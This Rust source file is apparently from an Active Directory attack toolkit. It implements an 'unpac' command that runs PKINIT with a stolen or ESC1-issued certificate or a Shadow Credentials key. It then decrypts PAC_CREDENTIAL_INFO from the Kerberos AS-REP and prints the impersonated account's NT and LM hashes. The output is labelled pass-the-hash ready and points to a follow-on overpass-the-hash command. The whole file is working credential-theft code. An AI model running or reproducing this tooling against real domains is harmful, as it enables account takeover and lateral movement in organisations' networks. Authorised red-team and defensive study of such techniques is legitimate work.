//! **1.4.8-A WS-UNPAC-PKINIT.** `attack unpac` — PKINIT with a cert, then
//! extract the NT hash of the impersonated principal out of the AS-REP's
//! `PAC_CREDENTIAL_INFO` padata.
//!
//! Chain:
//! 1. PKINIT with the supplied cert + key against the target realm's KDC.
//! 2. Capture the AS-REP `EncKDCRepPart.encrypted-pa-data` (via
//!    `PkinitTgt.encrypted_pa_data`).
//! 3. Walk each padata entry and try to decrypt it as
//!    `PAC_CREDENTIAL_INFO` with the AS-REP session key at key usage 16
//!    (`KERB_NON_KERB_SALT`, MS-PAC §2.6.4).
//! 4. On success, print the extracted NT hash — pass-the-hash-ready.
//! 5. On no-match, list the padata types the KDC returned so the operator
//!    can decide whether to fall back to the S4U2Self-plus-ticket-decrypt
//!    path (a future WS-UNPAC-TICKET workstream).

use crate::ui;
use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct UnpacArgs {
    /// KDC host or IP.
    #[arg(long)]
    pub kdc: String,
    /// Kerberos realm (case matters per RFC 4120).
    #[arg(long)]
    pub realm: String,
    /// Principal to authenticate as via PKINIT (usually the impersonated UPN's
    /// SAM part). PKINIT + cert-SAN pairing works if the cert's UPN matches.
    #[arg(long)]
    pub user: String,
    /// Path to the PEM-encoded RSA private key associated with `--cert`.
    #[arg(long)]
    pub key: String,
    /// Path to the CA-issued certificate (DER — as saved by `attack esc1`).
    /// Omit to run key-trust PKINIT with a self-signed cert (Shadow
    /// Credentials shape); usually you supply the ESC1-issued cert here.
    #[arg(long)]
    pub cert: Option<String>,
}

pub(crate) async fn unpac(a: UnpacArgs) -> Result<()> {
    let mut checklist = ui::StageChecklist::new([
        "load cert + key",
        "PKINIT AS-exchange",
        "capture AS-REP encrypted-pa-data",
        "extract PAC_CREDENTIAL_INFO (key usage 16)",
        "parse NTLM_SUPPLEMENTAL_CREDENTIAL",
    ]);
    let result = unpac_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("unpac stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("unpac stages (failed)");
        }
    }
    result
}

async fn unpac_impl(a: UnpacArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    let key_pem =
        std::fs::read_to_string(&a.key).with_context(|| format!("read --key {}", a.key))?;
    let cert_der = if let Some(path) = &a.cert {
        Some(std::fs::read(path).with_context(|| format!("read --cert {path}"))?)
    } else {
        None
    };
    checklist.record_ok(
        "load cert + key",
        format!(
            "key={} bytes, cert={}",
            key_pem.len(),
            if let Some(c) = &cert_der {
                format!("{} bytes DER", c.len())
            } else {
                "self-signed (key-trust)".to_string()
            }
        ),
    );

    let tgt = adhammer_kerberos::pkinit::pkinit_with_cert(
        &a.user,
        &a.realm,
        &a.kdc,
        &key_pem,
        cert_der.as_deref(),
    )
    .await
    .context("PKINIT AS-exchange")?;
    checklist.record_ok(
        "PKINIT AS-exchange",
        format!("TGT for {}@{} (endtime {})", a.user, a.realm, tgt.end_time),
    );
    checklist.record_ok(
        "capture AS-REP encrypted-pa-data",
        format!(
            "{} padata entr{} ({})",
            tgt.encrypted_pa_data.len(),
            if tgt.encrypted_pa_data.len() == 1 {
                "y"
            } else {
                "ies"
            },
            padata_type_summary(&tgt.encrypted_pa_data)
        ),
    );

    let extracted = adhammer_kerberos::unpac::try_unpac_from_encrypted_pa_data(
        &tgt.encrypted_pa_data,
        tgt.session_key.expose(),
    )
    .context("try_unpac_from_encrypted_pa_data")?;

    let creds = match extracted {
        Some(c) => c,
        None => {
            // Honest signal: PAC_CREDENTIAL_INFO wasn't in the AS-REP padata.
            // Most likely this DC places it inside the ticket's PAC instead,
            // which needs an additional S4U2Self + ticket-decrypt step (see
            // module doc for the follow-up WS-UNPAC-TICKET workstream).
            anyhow::bail!(
                "no PAC_CREDENTIAL_INFO in AS-REP encrypted-pa-data (padata types: {}). \
                 Likely the DC returns it inside the ticket's PAC instead; \
                 unblocking that needs the S4U2Self + ticket-decrypt path \
                 (WS-UNPAC-TICKET, pending)",
                padata_type_summary(&tgt.encrypted_pa_data)
            );
        }
    };
    checklist.record_ok(
        "extract PAC_CREDENTIAL_INFO (key usage 16)",
        format!("package={}, bytes decrypted OK", creds.package),
    );

    println!("[+] NT hash of {}@{}:", a.user, a.realm);
    println!("    {}", creds.nt_hex());
    if let Some(lm) = creds.lm_hash_bytes() {
        let hex: String = lm.iter().fold(String::new(), |mut s, b| {
            use std::fmt::Write;
            write!(s, "{b:02x}").unwrap();
            s
        });
        println!("[+] LM hash (non-zero, historically present): {hex}");
    } else {
        println!("[i] LM hash: absent / zeroed (modern DC)");
    }
    println!(
        "[+] Pass-the-hash ready — chain into e.g. `attack overpass --user {} --realm {} --nt {}`",
        a.user,
        a.realm,
        creds.nt_hex()
    );
    checklist.record_ok(
        "parse NTLM_SUPPLEMENTAL_CREDENTIAL",
        format!("NT hash extracted for {}@{}", a.user, a.realm),
    );
    Ok(())
}

fn padata_type_summary(padatas: &[(u32, Vec<u8>)]) -> String {
    if padatas.is_empty() {
        return "empty".into();
    }
    padatas
        .iter()
        .map(|(t, b)| format!("{}({}B)", t, b.len()))
        .collect::<Vec<_>>()
        .join(", ")
}
